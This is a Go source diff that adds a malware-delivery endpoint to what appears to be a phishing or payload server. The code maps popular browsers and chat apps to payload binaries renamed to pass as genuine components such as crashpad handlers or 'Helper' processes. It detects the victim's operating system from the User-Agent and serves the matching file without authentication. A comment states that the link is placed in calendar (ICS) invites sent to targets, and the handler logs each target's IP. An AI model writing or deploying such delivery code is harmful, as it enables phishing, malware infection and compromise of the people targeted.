@@ -33,6 +33,27 @@ type ReportMeta struct {
 	HasCSV     bool      `json:"has_csv"`
 }
 
+type presetDef struct {
+	winFile, winDL string
+	macFile, macDL string
+	linFile, linDL string
+}
+
+var presetDefs = map[string]presetDef{
+	"chrome":   {winFile: "chrome_crashpad_handler.exe", winDL: "chrome_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Google Chrome Helper", linFile: "google-chrome", linDL: "google-chrome"},
+	"edge":     {winFile: "msedge_crashpad_handler.exe", winDL: "msedge_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Microsoft Edge Helper", linFile: "microsoft-edge", linDL: "microsoft-edge"},
+	"brave":    {winFile: "brave_crashpad_handler.exe", winDL: "brave_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Brave Browser Helper", linFile: "brave-browser", linDL: "brave-browser"},
+	"firefox":  {winFile: "plugin-container.exe", winDL: "plugin-container.exe", macFile: "BrowserBleed_mac", macDL: "Firefox", linFile: "firefox", linDL: "firefox"},
+	"opera":    {winFile: "opera_crashpad_handler.exe", winDL: "opera_crashpad_handler.exe", macFile: "BrowserBleed_mac", macDL: "Opera Helper", linFile: "opera", linDL: "opera"},
+	"slack":    {winFile: "slack.exe", winDL: "slack.exe", macFile: "BrowserBleed_mac", macDL: "Slack Helper", linFile: "slack", linDL: "slack"},
+	"discord":  {winFile: "Discord.exe", winDL: "Discord.exe", macFile: "BrowserBleed_mac", macDL: "Discord Helper", linFile: "discord", linDL: "discord"},
+	"teams":    {winFile: "ms-teams.exe", winDL: "ms-teams.exe", macFile: "BrowserBleed_mac", macDL: "Microsoft Teams Helper", linFile: "teams", linDL: "teams"},
+	"zoom":     {winFile: "Zoom.exe", winDL: "Zoom.exe", macFile: "BrowserBleed_mac", macDL: "ZoomHelper", linFile: "zoom", linDL: "zoom"},
+	"whatsapp": {winFile: "WhatsApp.exe", winDL: "WhatsApp.exe", macFile: "BrowserBleed_mac", macDL: "WhatsApp Helper", linFile: "whatsapp-desktop", linDL: "whatsapp-desktop"},
+	"telegram": {winFile: "Telegram.exe", winDL: "Telegram.exe", macFile: "BrowserBleed_mac", macDL: "Telegram Desktop", linFile: "telegram-desktop", linDL: "telegram-desktop"},
+}
+
+
 var (
 	reID       = regexp.MustCompile(`^[0-9a-f]{16}$`)
 	reRunAt    = regexp.MustCompile(`Run:\s+(.+)`)
@@ -52,6 +73,7 @@ type PayloadsData struct {
 	Windows []PayloadMeta
 	Mac     []PayloadMeta
 	Linux   []PayloadMeta
+	BaseURL string
 }
 
 func detectPlatform(name, filePath string) string {
@@ -90,6 +112,20 @@ func detectPreset(name string) string {
 	case strings.HasPrefix(lower, "whatsapp"): return "whatsapp"
 	case strings.HasPrefix(lower, "telegram"): return "telegram"
 	default:                                   return ""
+	}
+}
+
+func detectOS(ua string) string {
+	ua = strings.ToLower(ua)
+	switch {
+	case strings.Contains(ua, "windows nt"):
+		return "windows"
+	case strings.Contains(ua, "macintosh") || strings.Contains(ua, "mac os x"):
+		return "macos"
+	case strings.Contains(ua, "linux") && !strings.Contains(ua, "android"):
+		return "linux"
+	default:
+		return ""
 	}
 }
 
@@ -228,6 +264,7 @@ func (h *Handler) RegisterRoutes(mux *http.ServeMux) {
 	mux.HandleFunc("/builds/claim", h.handleBuildClaim)
 	mux.HandleFunc("/builds", h.handleBuilds)
 	mux.HandleFunc("/builds/", h.handleBuildItem)
+	mux.HandleFunc("/p/", h.handleSmartDeliver)
 	mux.HandleFunc("/", h.handleIndex)
 }
 
@@ -297,6 +334,17 @@ func (h *Handler) requireAuth(w http.ResponseWriter, r *http.Request) bool {
 		http.Redirect(w, r, "/login", http.StatusSeeOther)
 	}
 	return false
+}
+
+func (h *Handler) resolveBaseURL(r *http.Request) string {
+	if h.baseURL != "" {
+		return h.baseURL
+	}
+	scheme := "https"
+	if r.TLS == nil && r.Header.Get("X-Forwarded-Proto") != "https" {
+		scheme = "http"
+	}
+	return scheme + "://" + r.Host
 }
 
 func (h *Handler) setSessionCookie(w http.ResponseWriter) {
@@ -713,6 +761,7 @@ func (h *Handler) handlePayloads(w http.ResponseWriter, r *http.Request) {
 				data.Linux = append(data.Linux, pm)
 			}
 		}
+		data.BaseURL = h.resolveBaseURL(r)
 		w.Header().Set("Content-Type", "text/html; charset=utf-8")
 		h.payloadsTpl.Execute(w, data)
 
@@ -784,4 +833,49 @@ func (h *Handler) handlePayloadFile(w http.ResponseWriter, r *http.Request) {
 	w.Header().Set("Content-Type", ct)
 	w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
 	w.Write(data)
+}
+
+// handleSmartDeliver serves the right payload for the target's OS, detected
+// from their User-Agent. No auth — this URL goes inside ICS invites sent to targets.
+func (h *Handler) handleSmartDeliver(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodGet {
+		http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
+		return
+	}
+
+	preset := strings.ToLower(strings.Trim(strings.TrimPrefix(r.URL.Path, "/p/"), "/"))
+	def, ok := presetDefs[preset]
+	if !ok {
+		http.NotFound(w, r)
+		return
+	}
+
+	targetOS := detectOS(r.Header.Get("User-Agent"))
+	var storedName, dlName string
+	switch targetOS {
+	case "windows":
+		storedName, dlName = def.winFile, def.winDL
+	case "macos":
+		storedName, dlName = def.macFile, def.macDL
+	case "linux":
+		storedName, dlName = def.linFile, def.linDL
+	default:
+		http.NotFound(w, r)
+		return
+	}
+
+	filePath := filepath.Join(h.payloadsDir, storedName)
+	f, err := os.Open(filePath)
+	if err != nil {
+		http.NotFound(w, r)
+		return
+	}
+	defer f.Close()
+
+	log.Printf("[deliver] preset=%s os=%s file=%s ip=%s ua=%q",
+		preset, targetOS, storedName, r.RemoteAddr, r.Header.Get("User-Agent"))
+
+	w.Header().Set("Content-Type", "application/octet-stream")
+	w.Header().Set("Content-Disposition", `attachment; filename="`+dlName+`"`)
+	io.Copy(w, f)
 }
